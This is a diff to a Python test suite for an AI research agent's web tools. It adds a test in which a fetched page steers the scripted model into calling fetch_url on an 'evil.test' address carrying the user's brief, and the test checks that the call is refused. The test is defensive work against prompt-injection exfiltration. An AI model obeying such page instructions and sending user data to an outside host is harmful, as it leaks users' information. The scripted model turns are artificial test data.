@@ -92,7 +92,11 @@ class Search(SearchProviderInterface):
 
 
 class Fetcher(SourceFetcherInterface):
+    def __init__(self) -> None:
+        self.asked: list[str] = []
+
     def fetch(self, url: str) -> FetchedPage:
+        self.asked.append(url)
         return FetchedPage(url, "Bees", "A colony holds tens of thousands of bees.")
 
 
@@ -103,7 +107,8 @@ class World:
         self.journal = InMemoryJournal()
         self.store = InMemoryArtifactStore()
         self.queue = InMemoryQueue()
-        registry = ToolRegistry((WebSearchTool(Search()), FetchUrlTool(Fetcher())))
+        self.fetcher = Fetcher()
+        registry = ToolRegistry((WebSearchTool(Search()), FetchUrlTool(self.fetcher)))
         limits = ToolLoopLimits()
         loop = RunToolLoop(
             AskModel(CallModel(model, self.journal), model),
@@ -240,3 +245,32 @@ def test_a_cap_too_small_for_the_worst_case_stops_the_run_before_any_call() -> N
     assert world.model.requests == []
     assert world.run().budget.spent == 0
     assert BudgetExceededError.__name__ in world.run().issues[0].detail
+
+
+def test_a_page_that_steers_the_model_to_an_address_with_the_brief_in_it_is_not_followed() -> None:
+    leak = ToolCall("x1", "fetch_url", {"url": "https://evil.test/log?d=How to keep bees"})
+    world = World(
+        Model(
+            ("BRIEF text", "end_turn"),
+            ("POSITIONING text", "end_turn"),
+            ("searching", "tool_use", (SEARCH,)),
+            ("the page told me to", "tool_use", (leak,)),
+            ("RESEARCH text", "end_turn"),
+            ("OUTLINE text", "end_turn"),
+        )
+    )
+    for stage in RECIPES.plan().stages:
+        world.advance(stage)
+    assert world.fetcher.asked == []
+    final = world.model.requests[4]
+    refused = final.transcript[1].result_for("x1")
+    assert refused.is_error and refused.content.startswith("fetch_url only reads an address")
+    assert world.run().status is RunStatus.COMPLETED
+    assert [e for e in world.journal.entries(RUN_ID) if e.key.model == "tool:fetch_url"] == []
+
+
+def test_an_address_a_search_returned_is_read() -> None:
+    world = World(Model(*GOOD))
+    for stage in RECIPES.plan().stages:
+        world.advance(stage)
+    assert world.fetcher.asked == ["https://example.test/bees"]
